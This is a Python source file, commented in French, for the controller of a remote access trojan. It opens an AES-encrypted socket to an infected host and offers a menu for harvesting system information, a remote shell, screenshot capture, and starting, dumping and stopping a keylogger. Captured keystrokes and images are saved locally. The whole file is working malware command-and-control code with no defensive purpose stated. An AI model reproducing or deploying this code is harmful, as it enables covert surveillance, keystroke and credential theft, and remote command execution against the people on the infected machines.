import os, socket, time , os.path, base64, argparse
from Crypto.Cipher import AES
from Crypto import Random
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from PIL import Image, ImageFile
ImageFile.LOAD_TRUNCATED_IMAGES = True

#CONSTANTES
BUFFERSIZE=2048
ENCODING = 'UTF-8'
FICHIERLOG = 'infoSystem.log'
KEYFILE = 'key_file.txt'


class Client():

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.KEY = b'Fhtjbh54kObnEGHK'
        self.os = ''

    def connect(self):  # se connecte
        try:
            self.s.connect((self.ip, self.port))
        except socket.timeout:  # si délai atteint ERREUR
            self.disconnect()
            print("[!] Aucune réponse du client.")
        except:
            self.disconnect()
            print("[!] Erreur lors de la connexion.")

    def disconnect(self):  # se deconnecte
        self.s.close()

    def load_key_public(self):
        with open("key_pub_client.pem", 'rb') as pem_in:  # récupère la clé publique depuis le fichier
            pemlines = pem_in.read()
            pubkey = load_pem_public_key(pemlines, backend=default_backend())
        return pubkey

    def send_AES(self):
        public_key = self.load_key_public()
        cipher_key = public_key.encrypt(self.KEY,
                                        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                                        algorithm=hashes.SHA256(),
                                                        label=None))
        # a l'aide du chiffrement asymétrique RSA on envoie la clé AES
        self.s.send(base64.b64encode(cipher_key))

    def iv(self):  # crée un vecteur d'initialisation aléatoire
        return Random.new().read(AES.block_size)

    def do_encrypt(self, message):
        iv = self.iv() # chaque fois qu'un message est envoyé un nouveau iv est crée
        enc = AES.new(self.KEY, AES.MODE_CFB , iv)
        cipherMessage = iv + enc.encrypt(message) # l'iv est envoyé en début du message
        return cipherMessage

    def do_decrypt(self, cipherMessage):
        enc = AES.new(self.KEY, AES.MODE_CFB, iv=cipherMessage[:16])  # récupere l'iv en début de message
        message = enc.decrypt(cipherMessage[16:]) #  déchiffre le reste du message"
        message = message.decode(ENCODING, errors='ignore')
        return message

    def run(self):

        print("En attente de connexion avec :" + self.ip)
        self.connect()
        print("Connexion etablie")
        self.send_AES()
        time.sleep(0.2)
        print("Recherche du systeme d'exploitation de la cible")
        self.get_operating_system()
        print("Recuperation du repertoire courant...")
        cwd = self.get_current_working_directory()  # cwd : Current Working Directory

        act = self.menu()
        while act != '0':
            self.task(act, cwd)
            act = self.menu()

    def menu(self):
        choix = -1
        while choix < 0 or choix > 7:
            print("0 : Quitter l'application")
            print("1 : Obtenir des informations")
            print("2 : Shell")
            print("3 : PrtScr")
            print("4 : Demarre le Keylogger")
            print("5 : Relever les informations collecter par le keylogger")
            print("6 : Eteindre le Keylogger")
            choix = int(input(" Choix :"))
        return choix

    def task(self, act, cwd):
        '''
        :param act: fait référence au choix du menu (0 - 6 )
        :param cwd: fait référence au current working directory
        il recoit le choix et démarre la/les fonction(s) nécessaire(s)
        '''
        if act == 0:
            self.s.send(self.do_encrypt('exit()'.encode(ENCODING)))
            exit()
        elif act == 1:
            self.get_system_informations()
        elif act == 2:
            cmd = input(cwd+'>')
            while cmd != 'exit()':
                shell = Shell(cmd, self.s, cwd, self.KEY)
                if cmd[:2] == 'cd':
                    shell.change_current_directory()
                    cwd = self.get_current_working_directory()

                else:
                    shell.send_cmd()
                cmd = input(cwd + '>')

        elif act == 3:
            self.print_screen()
        elif act == 4:
            self.keylogger("start")
        elif act == 5:
            self.keylogger("dump")
        elif act == 6:
            self.keylogger("stop")
        else:
            pass

    def get_system_informations(self):
        cmd = 'getinfo'
        try:
            cmdCipher = self.do_encrypt(cmd.encode(ENCODING))
            self.s.send(cmdCipher)
        except:
            print('Impossible de recevoir le retour du malware.')
        finally:
            message = ''
            # On fait une boucle qui va recevoir TOUTES les informations envoyees par notre malware
            while True:
                cipherData = self.s.recv(BUFFERSIZE)
                data = self.do_decrypt(cipherData)
                message = message + data

                if len(cipherData) < BUFFERSIZE:
                    # Dès qu'on ne recoit plus de donnees, on ecrit dans le fichier ce qu'on a recu
                    print('Ecriture du fichier : infoSystem.log')
                    with open(FICHIERLOG, 'a') as fichierLog:
                        fichierLog.write(str(message))
                    break
                else:
                    continue

    def get_operating_system(self):
        cmd = 'os'
        try:
            print(cmd)
            cmdCipher = self.do_encrypt(cmd.encode(ENCODING))
            self.s.send(cmdCipher)
        except:
            print("Recuperation du systeme d'exploitation échoué")
        finally:
            self.os = self.s.recv(BUFFERSIZE)
            self.os = self.do_decrypt(self.os)
            print ("Le système d'exploitation est un : "+self.os)

    def get_current_working_directory(self):
        cmd = 'cwd'
        try:
            cmdCipher = self.do_encrypt(cmd.encode(ENCODING))
            self.s.send(cmdCipher)
        except:
            print("Recuperation du repertoire courant échoué")
        finally:
            cwd = self.s.recv(BUFFERSIZE)
            cwd = self.do_decrypt(cwd)
            return cwd

    def print_screen(self):
        cmd = 'prtscr'
        try:
            cmdCipher = self.do_encrypt(cmd.encode(ENCODING))
            self.s.send(cmdCipher)
        except:
            print("Capture d'écran échoué")
        finally:
            strMalwareResponse = self.do_decrypt(self.s.recv(BUFFERSIZE)) # reçois les infos
            print("\n" + strMalwareResponse)
            intBuffer = ""
            for intCounter in range(0, len(strMalwareResponse)):  # obtiens la taille a partir de la réponse
                if strMalwareResponse[intCounter].isdigit():
                    intBuffer += strMalwareResponse[intCounter]
            intBuffer = int(intBuffer)

            strFile = time.strftime("%Y%m%d%H%M%S" + ".jpg")
            ScrnData = self.recvall(intBuffer)  # reçois l'image entiere
            objPic = open(strFile, "wb")
            objPic.write(ScrnData); # ecris l'image dans le fichier
            objPic.close()

            self.display_picture(strFile) #affiche l'image

            print("Screenshot reçu" + "\n" + "Total bytes: " + str(os.path.getsize(strFile)) + " bytes")

    def recvall(self, buffer):  # reçoit une grande quantité de données
        bytData = b""
        while True:
            bytPart = self.s.recv(buffer)
            if len(bytPart) == buffer:
                return bytPart
            bytData = bytData + bytPart
            if len(bytData) == buffer:
                return bytData

    def display_picture(self, name):
        try:
            picture = Image.open(os.getcwd()+'\\'+name)
        except:
            print ("Capture d'écran non trouvée")
        finally:
            picture.show()

    def keylogger(self, option):
        if option == "start":
            self.s.send(self.do_encrypt("keystart".encode(ENCODING)))
            if self.do_decrypt(self.s.recv(BUFFERSIZE)) == "error":
                print("Keylogger is already running.")

        elif option == "stop":
            self.s.send(self.do_encrypt("keystop".encode(ENCODING)))
            if self.do_decrypt(self.s.recv(BUFFERSIZE)) == "error":
                print("Keylogger is not running.")

        elif option == "dump":
            self.s.send(self.do_encrypt("keydump".encode(ENCODING)))
            intBuffer = self.do_decrypt(self.s.recv(BUFFERSIZE))

            if intBuffer == "error":
                print("Keylogger is not running.")
            elif intBuffer == "error2":
                print("No logs.")
            else:
                strLogs = self.do_decrypt(self.s.recv(BUFFERSIZE))  # recupere les informations capturées par le keylogger
                print("\n" + strLogs)
                with open(KEYFILE, 'w', encoding=ENCODING) as key_file:
                    key_file.write(strLogs)


class Shell(Client):
    def __init__(self, cmd: str, s, cwd, key):
        self.cmd = cmd
        self.s = s
        self.cwd = cwd
        self.KEY = key

    def send_cmd(self):
        cmdCipher= self.do_encrypt(self.cmd.encode(ENCODING))
        self.s.sendall(cmdCipher)
        result = self.s.recv(16384)
        result = self.do_decrypt(result)

        print(result)
        print("\n")

    def change_current_directory(self):
        self.s.send(self.do_encrypt(self.cmd.encode(ENCODING)))


#######MAIN######

parser = argparse.ArgumentParser()
parser.add_argument("adresseIP", help="adresse IP du malware ( ex : 192.168.0.12 )")
parser.add_argument("-p","--port", type=int, help="port à utiliser ( default : 50000 )")
# l'ip sera un argument obligatoire
# le port sera un argument en option (si aucun n'est renseigné, il sera défini sur 50000
args = parser.parse_args()

ip = args.adresseIP
if args.port is None:
    port = 50000
else:
    port = args.port
print(f"{ip}:{port}")

go = Client(ip, port)
go.run()







